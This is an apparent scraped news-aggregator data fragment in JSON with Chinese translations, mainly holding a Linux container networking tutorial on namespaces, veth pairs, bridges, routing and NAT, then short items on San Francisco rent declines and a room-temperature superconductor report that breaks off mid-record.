ping\u7edf\u8ba1\u6570\u636e-\u53d1\u90012\u4e2a\u6570\u636e\u5305\uff0c2\u4e2a\u63a5\u6536\uff0c0%\u4e22\u5305\uff0cTime 14msrtt min/avg/max/mdev=0.036/0.044/0.053/0.010 ms#\u5e76\u5bf9`netns1`\u91cd\u590d\u66f4\u6539\u3002\n\u6b64\u66f4\u6539\u57fa\u672c\u4e0a\u5c06\u4e3b\u673a\u8f6c\u53d8\u4e3a\u8def\u7531\u5668\uff0c\u7f51\u6865\u63a5\u53e3\u6210\u4e3a\u5bb9\u5668\u7684\u9ed8\u8ba4\u7f51\u5173\u3002\n\u975e\u5e38\u597d\uff0c\u6211\u4eec\u5c06\u5bb9\u5668\u4e0e\u6839\u547d\u540d\u7a7a\u95f4\u8fde\u63a5\u8d77\u6765\u3002\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u8bd5\u7740\u628a\u4ed6\u4eec\u4e0e\u5916\u754c\u8054\u7cfb\u8d77\u6765\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5728Linux\u4e2d\u7981\u7528\u6570\u636e\u5305\u8f6c\u53d1(\u5373\u8def\u7531\u5668\u529f\u80fd)\u3002\u6211\u4eec\u9700\u8981\u6253\u5f00\u5b83\uff1a\n\u55ef\uff0c\u8fd8\u662f\u4e0d\u7ba1\u7528\u3002\u6211\u4eec\u9519\u8fc7\u4e86\u4ec0\u4e48\uff1f\u5982\u679c\u5bb9\u5668\u8981\u5411\u5916\u90e8\u4e16\u754c\u53d1\u9001\u6570\u636e\u5305\uff0c\u76ee\u7684\u670d\u52a1\u5668\u5c06\u65e0\u6cd5\u5c06\u6570\u636e\u5305\u53d1\u9001\u56de\u5bb9\u5668\uff0c\u56e0\u4e3a\u5bb9\u5668\u7684IP\u5730\u5740\u662f\u79c1\u6709\u7684\u3002\u5373\u8be5\u7279\u5b9aIP\u7684\u8def\u7531\u89c4\u5219\u4ec5\u4e3a\u672c\u5730\u7f51\u7edc\u6240\u77e5\u3002\u4e16\u754c\u4e0a\u7684\u8bb8\u591a\u5bb9\u5668\u5171\u4eab\u5b8c\u5168\u76f8\u540c\u7684\u79c1\u6709IP\u5730\u5740172.18.0.10\u3002\u6b64\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6848\u79f0\u4e3a\u7f51\u7edc\u5730\u5740\u8f6c\u6362(NAT)\u3002\u5728\u8fdb\u5165\u5916\u90e8\u7f51\u7edc\u4e4b\u524d\uff0c\u5bb9\u5668\u53d1\u51fa\u7684\u6570\u636e\u5305\u5c06\u5176\u6e90IP\u5730\u5740\u66ff\u6362\u4e3a\u4e3b\u673a\u7684\u5916\u90e8\u63a5\u53e3\u5730\u5740\u3002\u4e3b\u529e\u65b9\u8fd8\u5c06\u8ddf\u8e2a\u3002\n.", "note_en": "Working with containers always feels like magic. In a good way for those who understand the internals and in a terrifying - for those who don&#39;t. Luckily, we&#39;ve been looking under the hood of the containerization technology for quite some time already and even managed to uncover that  containers are just isolated and restricted Linux processes, that  images aren&#39;t really needed to run containers, and on the contrary -  to build an image we need to run some containers.\n Now comes a time to tackle the container networking problem. Or, more precisely, a single-host container networking problem. In this article, we are going to answer the following questions:\n How to virtualize network resources to make containers think each of them has a dedicated network stack?\n How to turn containers into friendly neighbors, prevent them from interfering, and teach to communicate well?\n  How to reach containers running on a machine from the outside world ( aka port publishing)?\n As a result, it&#39;ll become apparent that the single-host container networking is nothing more than a simple combination of the well-known Linux facilities:\n  And for better or worse, no code is required to make the networking magic happen...\n  Any decent Linux distribution would probably suffice. All the examples in the article have been made on a fresh  vagrant CentOS 8 virtual machine:\n  For the sake of simplicity of the examples, in this article, we are not going to rely on any fully-fledged containerization solution (e.g.  docker or  podman). Instead, we&#39;ll focus on the basic concepts and use the bare minimum tooling to achieve our learning goals.\n  What constitutes a Linux network stack? Well, obviously, the set of network devices. What else? Probably, the set of routing rules. And not to forget, the set of netfilter hooks, including defined by iptables rules.\n  #!/usr/bin/env bashecho &#34;&gt; Network devices&#34;ip linkecho -e &#34;\\n&gt; Route table&#34;ip routeecho -e &#34;\\n&gt; Iptables rules&#34;iptables --list-rules\n    $ sudo ./inspect-net-stack.sh&gt; Network devices1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:002: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff&gt; Route tabledefault via 10.0.2.2 dev eth0 proto dhcp metric 10010.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100&gt; Iptables rules-P INPUT ACCEPT-P FORWARD ACCEPT-P OUTPUT ACCEPT-N ROOT_NS\n We are interested in that output because we want to make sure that each of the containers we are going to create soon will get a separate network stack.\n Well, you might have heard already, that one of the Linux namespaces used for containers isolation is called  network namespace. From   man ip-netns,  &#34;network namespace is logically another copy of the network stack, with its own routes, firewall rules, and network devices.&#34; For the sake of simplicity, this is the only namespace we&#39;re going to use in this article. Instead of creating fully-isolated containers, we&#39;d rather restrict the scope to only the network stack.\n One of the ways to create a network namespace is the  ip tool - part of the de facto standard  iproute2 collection:\n  How to start using the just created namespace? There is a lovely Linux command called  nsenter. It enters one or more of the specified namespaces and then executes the given program:\n $ sudo nsenter --net=/var/run/netns/netns0 bash# The newly created bash process lives in netns0$ sudo ./inspect-net-stack.sh&gt; Network devices1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00&gt; Route table&gt; Iptables rules-P INPUT ACCEPT-P FORWARD ACCEPT-P OUTPUT ACCEPT\n From the output above it&#39;s clear that the  bash process running inside  netns0 namespace sees a totally different network stack. There is no routing rules at all, no custom iptables chain, and only one loopback network device. So far, so good...\n   A dedicated network stack would be not so useful if we could not communicate with it. Luckily, Linux provides a suitable facility for that - a virtual Ethernet device! From   man veth,  &#34;veth devices are virtual Ethernet devices. They can act as tunnels between network namespaces to create a bridge to a physical network device in another namespace, but can also be used as standalone network devices.&#34;\n Virtual Ethernet devices always go in pairs. No worries, it&#39;ll be clear when we take a look at the creation command:\n  With this single command, we just created a pair of  interconnected virtual Ethernet devices. The names  veth0 and  ceth0 have been chosen arbitrarily:\n $ ip link1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:002: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff5: ceth0@veth0: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/ether 66:2d:24:e3:49:3f brd ff:ff:ff:ff:ff:ff6: veth0@ceth0: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/ether 96:e8:de:1d:22:e0 brd ff:ff:ff:ff:ff:ff\n Both  veth0 and  ceth0 after creation resides on the host&#39;s network stack (also called root network namespace). To connect the root namespace with the  netns0 namespace, we need to keep one of the devices in the root namespace and move another one into the  netns0:\n $ sudo ip link set ceth0 netns netns0# List all the devices to make sure one of them disappeared from the root stack$ ip link1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:002: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff6: veth0@if5: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/ether 96:e8:de:1d:22:e0 brd ff:ff:ff:ff:ff:ff link-netns netns0\n Once we turn the devices on and assign proper IP addresses, any packet occurring on one of the devices will immediately pop up on its peer device connecting two namespaces. Let&#39;s start from the root namespace:\n   $ sudo nsenter --net=/var/run/netns/netns0$ ip link set lo up # whoops$ ip link set ceth0 up$ ip addr add 172.18.0.10/16 dev ceth0$ ip link1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:005: ceth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000 link/ether 66:2d:24:e3:49:3f brd ff:ff:ff:ff:ff:ff link-netnsid 0\n   # From `netns0`, ping root&#39;s veth0$ ping -c 2 172.18.0.11PING 172.18.0.11 (172.18.0.11) 56(84) bytes of data.64 bytes from 172.18.0.11: icmp_seq=1 ttl=64 time=0.038 ms64 bytes from 172.18.0.11: icmp_seq=2 ttl=64 time=0.040 ms--- 172.18.0.11 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 58msrtt min/avg/max/mdev = 0.038/0.039/0.040/0.001 ms# Leave `netns0`$ exit# From root namespace, ping ceth0$ ping -c 2 172.18.0.10PING 172.18.0.10 (172.18.0.10) 56(84) bytes of data.64 bytes from 172.18.0.10: icmp_seq=1 ttl=64 time=0.073 ms64 bytes from 172.18.0.10: icmp_seq=2 ttl=64 time=0.046 ms--- 172.18.0.10 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 3msrtt min/avg/max/mdev = 0.046/0.059/0.073/0.015 ms\n At the same time, if we try to reach any other addresses from the  netns0 namespace, we are not going to succeed:\n # Inside root namespace$ ip addr show dev eth02: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 52:54:00:e3:27:77 brd ff:ff:ff:ff:ff:ff inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0 valid_lft 84057sec preferred_lft 84057sec inet6 fe80::5054:ff:fee3:2777/64 scope link valid_lft forever preferred_lft forever# Remember this 10.0.2.15$ sudo nsenter --net=/var/run/netns/netns0# Try host&#39;s eth0$ ping 10.0.2.15connect: Network is unreachable# Try something from the Internet$ ping 8.8.8.8connect: Network is unreachable\n That&#39;s easy to explain, though. There is simply no route in the  netns0 routing table for such packets. The only entry there shows how to reach  172.18.0.0/16 network:\n  Linux has a bunch of ways to populate the routing table. One of them is to extract routes from the directly attached network interfaces. Remember, the routing table in  netns0 was empty right after the namespace creation. But then we added the  ceth0 device there and assigned it an IP address  172.18.0.10/16. Since we were using not a simple IP address, but a combination of the address and the netmask, the network stack managed to extract the routing information from it. Every packet destined to  172.18.0.0/16 network will be sent through  ceth0 device. But any other packets will be discarded. Similarly, there is a new route in the root namespace:\n # From `root` namespace:$ ip route# ... omited lines ...172.18.0.0/16 dev veth0 proto kernel scope link src 172.18.0.11\n At this point, we are ready to mark our very first question answered.  We know now how to isolate, virtualize, and connect Linux network stacks.\n  The whole idea of containerization boils down to efficient resource sharing. I.e. it&#39;s uncommon to have a single container per machine. Instead, the goal is to run as many isolated processes in the shared environment as possible. So, what&#39;d happen if we were to place multiple containers on the same host following the  veth approach from above? Let&#39;s add the second  container:\n # From root namespace$ sudo ip netns add netns1$ sudo ip link add veth1 type veth peer name ceth1$ sudo ip link set ceth1 netns netns1$ sudo ip link set veth1 up$ sudo ip addr add 172.18.0.21/16 dev veth1$ sudo nsenter --net=/var/run/netns/netns1$ ip link set lo up$ ip link set ceth1 up$ ip addr add 172.18.0.20/16 dev ceth1\n  # From `netns1` we cannot reach the root namespace!$ ping -c 2 172.18.0.21PING 172.18.0.21 (172.18.0.21) 56(84) bytes of data.From 172.18.0.20 icmp_seq=1 Destination Host UnreachableFrom 172.18.0.20 icmp_seq=2 Destination Host Unreachable--- 172.18.0.21 ping statistics ---2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 55mspipe 2# But there is a route!$ ip route172.18.0.0/16 dev ceth1 proto kernel scope link src 172.18.0.20# Leaving `netns1`$ exit# From root namespace we cannot reach the `netns1`$ ping -c 2 172.18.0.20PING 172.18.0.20 (172.18.0.20) 56(84) bytes of data.From 172.18.0.11 icmp_seq=1 Destination Host UnreachableFrom 172.18.0.11 icmp_seq=2 Destination Host Unreachable--- 172.18.0.20 ping statistics ---2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 23mspipe 2# From `netns0` we CAN reach `veth1`$ sudo nsenter --net=/var/run/netns/netns0$ ping -c 2 172.18.0.21PING 172.18.0.21 (172.18.0.21) 56(84) bytes of data.64 bytes from 172.18.0.21: icmp_seq=1 ttl=64 time=0.037 ms64 bytes from 172.18.0.21: icmp_seq=2 ttl=64 time=0.046 ms--- 172.18.0.21 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 33msrtt min/avg/max/mdev = 0.037/0.041/0.046/0.007 ms# But we still cannot reach `netns1`$ ping -c 2 172.18.0.20PING 172.18.0.20 (172.18.0.20) 56(84) bytes of data.From 172.18.0.10 icmp_seq=1 Destination Host UnreachableFrom 172.18.0.10 icmp_seq=2 Destination Host Unreachable--- 172.18.0.20 ping statistics ---2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 63mspipe 2\n Whoops! Something is wrong...  netns1 is stuck in limbo. For some reason, it cannot talk to the root and from the root namespace we cannot reach it out too. However, since both containers reside in the same IP network  172.18.0.0/16, we now can talk to the host&#39;s  veth1 from the  netns0 container. Interesting...\n Well, it took me some time to figure it out, but apparently we are facing the clash of routes. Let&#39;s inspect the routing table in the root namespace:\n $ ip route# ... omited lines ... #172.18.0.0/16 dev veth0 proto kernel scope link src 172.18.0.11172.18.0.0/16 dev veth1 proto kernel scope link src 172.18.0.21\n Even though after adding the second  veth pair, root&#39;s network stack learned the new route  172.18.0.0/16 dev veth1 proto kernel scope link src 172.18.0.21, there already was an existing route for exactly the same network. When the second container tries to ping  veth1 device, the first route is being selected breaking the connectivity. If we were to delete the first route  sudo ip route delete 172.18.0.0/16 dev veth0 proto kernel scope link src 172.18.0.11 and recheck the connectivity, the situation would turn into a mirrored case. I.e. the connectivity of the  netns1 would be restored, but  netns0 would be in limbo.\n  Well, I believe if we selected another IP network for  netns1, everything would work. However, multiple containers sitting in one IP network is a legitimate use case. Thus, we need to adjust the  veth approach somehow...\n Behold the Linux bridge - yet another virtualized network facility! The Linux bridge behaves like a network switch. It forwards packets between interfaces that are connected to it. And since it&#39;s a switch, it does it on the L2 (i.e. Ethernet) level.\n Let&#39;s try to play with our new toy. But first, we need to clean up the existing setup because some of the configurational changes we&#39;ve made so far aren&#39;t really needed anymore. Removing network namespaces would suffice:\n $ sudo ip netns delete netns0$ sudo ip netns delete netns1# But if you still have some leftovers...$ sudo ip link delete veth0$ sudo ip link delete ceth0$ sudo ip link delete veth1$ sudo ip link delete ceth1\n Quickly re-create two containers. Notice, we don&#39;t assign any IP address to the new  veth0 and  veth1 devices:\n $ sudo ip netns add netns0$ sudo ip link add veth0 type veth peer name ceth0$ sudo ip link set veth0 up$ sudo ip link set ceth0 netns netns0$ sudo nsenter --net=/var/run/netns/netns0$ ip link set lo up$ ip link set ceth0 up$ ip addr add 172.18.0.10/16 dev ceth0$ exit$ sudo ip netns add netns1$ sudo ip link add veth1 type veth peer name ceth1$ sudo ip link set veth1 up$ sudo ip link set ceth1 netns netns1$ sudo nsenter --net=/var/run/netns/netns1$ ip link set lo up$ ip link set ceth1 up$ ip addr add 172.18.0.20/16 dev ceth1$ exit\n  $ ip routedefault via 10.0.2.2 dev eth0 proto dhcp metric 10010.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100\n    $ sudo ip link set veth0 master br0$ sudo ip link set veth1 master br0\n   $ sudo nsenter --net=/var/run/netns/netns0$ ping -c 2 172.18.0.20PING 172.18.0.20 (172.18.0.20) 56(84) bytes of data.64 bytes from 172.18.0.20: icmp_seq=1 ttl=64 time=0.259 ms64 bytes from 172.18.0.20: icmp_seq=2 ttl=64 time=0.051 ms--- 172.18.0.20 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 2msrtt min/avg/max/mdev = 0.051/0.155/0.259/0.104 ms\n $ sudo nsenter --net=/var/run/netns/netns1$ ping -c 2 172.18.0.10PING 172.18.0.10 (172.18.0.10) 56(84) bytes of data.64 bytes from 172.18.0.10: icmp_seq=1 ttl=64 time=0.037 ms64 bytes from 172.18.0.10: icmp_seq=2 ttl=64 time=0.089 ms--- 172.18.0.10 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 36msrtt min/avg/max/mdev = 0.037/0.063/0.089/0.026 ms\n Lovely! Everything works great. With this new approach, we haven&#39;t been configuring  veth0 and  veth1 at all. The only two IP addresses we assigned were on the  ceth0 and  ceth1 ends. But since both of them are on the same Ethernet segment (remember, we connected them to the virtual switch), there is connectivity on the L2 level:\n $ sudo nsenter --net=/var/run/netns/netns0$ ip neigh172.18.0.20 dev ceth0 lladdr 6e:9c:ae:02:60:de STALE$ exit$ sudo nsenter --net=/var/run/netns/netns1$ ip neigh172.18.0.10 dev ceth1 lladdr 66:f3:8c:75:09:29 STALE$ exit\n Congratulations, we learned how to  turn containers into friendly neighbors, prevent them from interfering, but keep the connectivity.\n  Our containers can talk to each other. But can they talk to the host, i.e. the root namespace?\n     # Use exit to leave `netns0` first:$ ping -c 2 172.18.0.10PING 172.18.0.10 (172.18.0.10) 56(84) bytes of data.From 213.51.1.123 icmp_seq=1 Destination Net UnreachableFrom 213.51.1.123 icmp_seq=2 Destination Net Unreachable--- 172.18.0.10 ping statistics ---2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 3ms$ ping -c 2 172.18.0.20PING 172.18.0.20 (172.18.0.20) 56(84) bytes of data.From 213.51.1.123 icmp_seq=1 Destination Net UnreachableFrom 213.51.1.123 icmp_seq=2 Destination Net Unreachable--- 172.18.0.20 ping statistics ---2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 3ms\n To establish the connectivity between the root and container namespaces, we need to assign the IP address to the bridge network interface:\n  Once we assigned the IP address to the bridge interface, we got a route on the host routing table:\n $ ip route# ... omited lines ...172.18.0.0/16 dev br0 proto kernel scope link src 172.18.0.1$ ping -c 2 172.18.0.10PING 172.18.0.10 (172.18.0.10) 56(84) bytes of data.64 bytes from 172.18.0.10: icmp_seq=1 ttl=64 time=0.036 ms64 bytes from 172.18.0.10: icmp_seq=2 ttl=64 time=0.049 ms--- 172.18.0.10 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 11msrtt min/avg/max/mdev = 0.036/0.042/0.049/0.009 ms$ ping -c 2 172.18.0.20PING 172.18.0.20 (172.18.0.20) 56(84) bytes of data.64 bytes from 172.18.0.20: icmp_seq=1 ttl=64 time=0.059 ms64 bytes from 172.18.0.20: icmp_seq=2 ttl=64 time=0.056 ms--- 172.18.0.20 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 4msrtt min/avg/max/mdev = 0.056/0.057/0.059/0.007 ms\n The container probably also got an ability to ping the bridge interface, but they still cannot reach out to host&#39;s  eth0. We need to add the default route for containers:\n $ sudo nsenter --net=/var/run/netns/netns0$ ip route add default via 172.18.0.1$ ping -c 2 10.0.2.15PING 10.0.2.15 (10.0.2.15) 56(84) bytes of data.64 bytes from 10.0.2.15: icmp_seq=1 ttl=64 time=0.036 ms64 bytes from 10.0.2.15: icmp_seq=2 ttl=64 time=0.053 ms--- 10.0.2.15 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 14msrtt min/avg/max/mdev = 0.036/0.044/0.053/0.010 ms# And repeat the change for `netns1`\n This change basically turned the host machine into a router and the bridge interface became the default gateway for the containers.\n  Perfect, we connected containers with the root namespace. Now, let&#39;s try to connect them to the outside world. By default, the packet forwarding (i.e. the router functionality) is disabled in Linux. We need to turn it on:\n    Well, still doesn&#39;t work. What have we missed? If the container were to sends packets to the outside world, the destination server would not be able to send packets back to the container because the container&#39;s IP address is private. I.e. the routing rules for that particular IP are known only to the local network. And lots of the containers in the world share exactly the same private IP address  172.18.0.10. The solution to this problem is called the  Network address translation (NAT). Before going to the external network, packets originated by the containers will get their source IP addresses replaced with the host&#39;s external interface address. The host also will track \n......", "posttime": "2020-10-19 13:50:55", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u96c6\u88c5\u7bb1,networking,\u5bb9\u5668", "title": "\u96c6\u88c5\u7bb1\u8054\u7f51\u5f88\u7b80\u5355", "title_en": "Container Networking Is Simple", "transed": 1, "url": "https://iximiuz.com/en/posts/container-networking-is-simple/", "via": "", "real_tags": ["\u96c6\u88c5\u7bb1", "\u5bb9\u5668"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029707, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u867d\u7136\u6574\u4e2a\u65e7\u91d1\u5c71\u6e7e\u533a\u548c\u5168\u56fd\u8bb8\u591a\u57ce\u5e02\u7684\u79df\u91d1\u90fd\u5728\u4e0b\u964d\uff0c\u4f46\u6ca1\u6709\u4e00\u4e2a\u5730\u65b9\u7684\u623f\u4ef7\u4e0b\u964d\u5f97\u6bd4\u65e7\u91d1\u5c71\u66f4\u8fdc\u6216\u66f4\u5feb\u3002\n\u8fc8\u514b\u5c14\u00b7\u52a0\u65af\u5e15\u7f57\u7ef4\u5947(Michael Gasparovic)\u5373\u5c06\u7701\u4e0b\u4e00\u5927\u7b14\u94b1\uff0c\u5c31\u50cf\u73b0\u5728\u4f4f\u5728\u8fd9\u5ea7\u57ce\u5e02\u7684\u8bb8\u591a\u4eba\u4e00\u6837\uff0c\u4ed6\u6253\u7b97\u901a\u8fc7\u642c\u51fa\u53bb\u6765\u505a\u5230\u8fd9\u4e00\u70b9\u3002\n\u6240\u4ee5\u6211\u8981\u642c\u5230\u4e00\u4e2a\u6211\u4ed8\u4e00\u534a\u94b1\u7684\u5730\u65b9\uff0c\u6211\u53ef\u4ee5\u505a\u597d\u6211\u7684\u5de5\u4f5c\uff0c\u800c\u4e14\u6211\u8fd8\u53ef\u4ee5\u6ed1\u96ea\u3001\u51b2\u6d6a\u548c\u9a91\u81ea\u884c\u8f66\u3002\u201c\u4ed6\u8bf4\uff0c\u201d\u6211\u8981\u642c\u5230\u522b\u7684\u5730\u65b9\u53bb\uff0c\u53ea\u8981\u4ed8\u4e00\u534a\u7684\u94b1\uff0c\u6211\u5c31\u53ef\u4ee5\u505a\u597d\u6211\u7684\u5de5\u4f5c\uff0c\u800c\u4e14\u6211\u8fd8\u53ef\u4ee5\u6ed1\u96ea\u3001\u51b2\u6d6a\u548c\u9a91\u81ea\u884c\u8f66\u3002\u201c\u3002\n\u6839\u636e\u6700\u8fd1\u7684\u4e00\u9879\u8c03\u67e5\uff0c\u6709\u8db3\u591f\u591a\u7684\u79df\u6237\u79bb\u5f00\u8fd9\u5ea7\u57ce\u5e02\uff0c\u4ee5\u81f3\u4e8e\u5178\u578b\u7684\u5355\u95f4\u516c\u5bd3\u6bd4\u53bb\u5e74\u4e0b\u964d\u4e8630%\uff0c\u4e00\u5c45\u5ba4\u4e0b\u964d\u4e8624%\uff0c\u4e24\u5ba4\u79df\u91d1\u4e0b\u964d\u4e8621%\u3002\nZumper\u9996\u5e2d\u6267\u884c\u5b98\u5b89\u7279\u83ab\u65af\u00b7\u4e54\u6cbb\u4e9a\u5179\u8bf4\uff1a\u201c\u6211\u4eec\u8fd8\u6ca1\u6709\u89c1\u8fc7\u8fd9\u6837\u7684\u60c5\u51b5\u3002\u201d\u5728\u8d77\u4f5c\u7528\u7684\u56e0\u7d20\u4e2d\uff0c\u7ecf\u6d4e\u8870\u9000\u548c\u90a3\u4e9b\u4e0d\u9700\u8981\u4f60\u6765\u4e0a\u73ed\u7684\u516c\u53f8\u51fa\u73b0\u4e86\u5de8\u5927\u7684\u7e41\u8363\u3002\n\u4e54\u6cbb\u4e9a\u5179\u8bf4\uff0c\u8fd9\u662f\u7ecf\u6d4e\u8870\u9000\u5bf9\u9700\u6c42\u65b9\u9762\u7684\u590d\u5408\u5f71\u54cd\uff0c\u4ee5\u53ca\u642c\u5230\u5bb6\u91cc\u5de5\u4f5c\uff0c\u6216\u8005\u5728\u4efb\u4f55\u4f60\u60f3\u53bb\u7684\u5730\u65b9\u5de5\u4f5c\u7684\u80fd\u529b\u3002\n\u53e6\u4e00\u4e2a\u56e0\u7d20\u662f\uff0c\u79d1\u6280\u516c\u53f8\u4ecd\u5728\u65e7\u91d1\u5c71\u6e7e\u533a\u62db\u8058\u5458\u5de5\uff0c\u4f46\u544a\u8bc9\u65b0\u5458\u5de5\uff0c\u4ed6\u4eec\u4e0d\u5fc5\u642c\u5230\u90a3\u91cc\u53bb--\u76ee\u524d\u8fd8\u6ca1\u6709\u3002", "note_en": "While rents are dipping in many cities throughout the Bay Area and the country, no place is seeing prices drop further or faster than San Francisco.\n Michael Gasparovic is about to save a lot of money and, like many people who live in the city these days, he\u2019s going to do it by moving out.\n &#34;So I&#39;m moving somewhere where I&#39;m paying half the price, I can do my job just as well, and I&#39;ll be able to ski and surf and cycle,\u201d he said.\n   According to a recent survey, enough renters are leaving the city that the typical studio apartment is down 30% over the last year, one bedrooms down 24% and two bedroom rents down 21%.\n &#34;We haven&#39;t seen anything like that,\u201d said Anthemos Georgiades, Zumper CEO. Among the factors at work, a recession, and a huge boom in the companies that don&#39;t require you to come in to work.\n &#34;It&#39;s the compound effect on the demand side of a recession, and the move to work from home, or the ability to work wherever you want,&#34; said Georgiades.\n Another factor is that tech companies are still hiring in the Bay Area, but telling new employees that they don&#39;t have to move there -- yet.", "posttime": "2020-10-19 13:50:44", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u65e7\u91d1\u5c71,\u623f\u79df,francisco,\u4e0b\u964d", "title": "\u65e7\u91d1\u5c71\u623f\u79df\u4ef7\u683c\u5927\u5e45\u4e0b\u8dcc", "title_en": "San Francisco Sees Dramatic Drop in Rent Prices", "transed": 1, "url": "https://www.nbcbayarea.com/news/local/san-francisco-sees-dramatic-drop-in-rent-prices/2380636/", "via": "", "real_tags": ["\u65e7\u91d1\u5c71", "\u623f\u79df", "francisco", "\u4e0b\u964d"]}, {"category": "", "categoryclass": "", "imagename": "4b3fe5525d458a9d2c79e970b5ed4bbc.jpg", "infoid": 1029706, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u79d1\u5b66\u5bb6\u4eec\u521b\u9020\u4e86\u4e00\u79cd\u795e\u79d8\u7684\u6750\u6599\uff0c\u5b83\u5728\u9ad8\u8fbe15\u2009\u00b0C\u7684\u6e29\u5ea6\u4e0b\u4f3c\u4e4e\u6ca1\u6709\u4efb\u4f55\u7535\u963b\u5730\u5bfc\u7535\uff0c\u8fd9\u662f\u8d85\u5bfc\u7684\u65b0\u8bb0\u5f55\uff0c\u8fd9\u4e00\u73b0\u8c61\u901a\u5e38\u4e0e\u975e\u5e38\u4f4e\u7684\u6e29\u5ea6\u6709\u5173\u3002\u4eba\u4eec\u5bf9\u8fd9\u79cd\u6750\u6599\u672c\u8eab\u77e5\u4e4b\u751a\u5c11\uff0c\u4f46\u5b83\u663e\u793a\u4e862015\u5e74\u53d1\u73b0\u7684\u4e00\u7c7b\u8d85\u5bfc\u4f53\u7684\u6f5c\u529b\u3002\n\u7136\u800c\uff0c\u8d85\u5bfc\u4f53\u6709\u4e00\u4e2a\u4e25\u91cd\u7684\u9650\u5236\uff1a\u5b83\u53ea\u80fd\u5728\u63a5\u8fd1\u5730\u7403\u4e2d\u5fc3\u7684\u6781\u9ad8\u538b\u529b\u4e0b\u5b58\u6d3b\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4e0d\u4f1a\u7acb\u5373\u6709\u4efb\u4f55\u5b9e\u9645\u5e94\u7528\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u7269\u7406\u5b66\u5bb6\u5e0c\u671b\u5b83\u80fd\u4e3a\u96f6\u7535\u963b\u6750\u6599\u7684\u5f00\u53d1\u94fa\u5e73\u9053\u8def\uff0c\u8fd9\u79cd\u6750\u6599\u53ef\u4ee5\u5728\u8f83\u4f4e\u7684\u538b\u529b\u4e0b\u53d1\u6325\u4f5c\u7528\u3002\n\u8d85\u5bfc\u4f53\u6709\u8bb8\u591a\u6280\u672f\u5e94\u7528\uff0c\u4ece\u78c1\u5171\u632f\u6210\u50cf\u673a\u5230\u624b\u673a\u53d1\u5c04\u5854\uff0c\u7814\u7a76\u4eba\u5458\u6b63\u5f00\u59cb\u5728\u98ce\u529b\u6da1\u8f6e\u673a\u7684\u9ad8\u6027\u80fd\u53d1\u7535\u673a\u4e2d\u8fdb\u884c\u8bd5\u9a8c\u3002\u4f46\u7531\u4e8e\u9700\u8981\u5e9e\u5927\u7684\u4f4e\u6e29\u8bbe\u5907\uff0c\u5b83\u4eec\u7684\u7528\u9014\u4ecd\u7136\u53d7\u5230\u9650\u5236\u3002\u666e\u901a\u8d85\u5bfc\u4f53\u5728\u5927\u6c14\u538b\u4e0b\u5de5\u4f5c\uff0c\u4f46\u524d\u63d0\u662f\u5b83\u4eec\u5fc5\u987b\u4fdd\u6301\u975e\u5e38\u4f4e\u7684\u6e29\u5ea6\u3002\u5373\u4f7f\u662f\u6700\u5c16\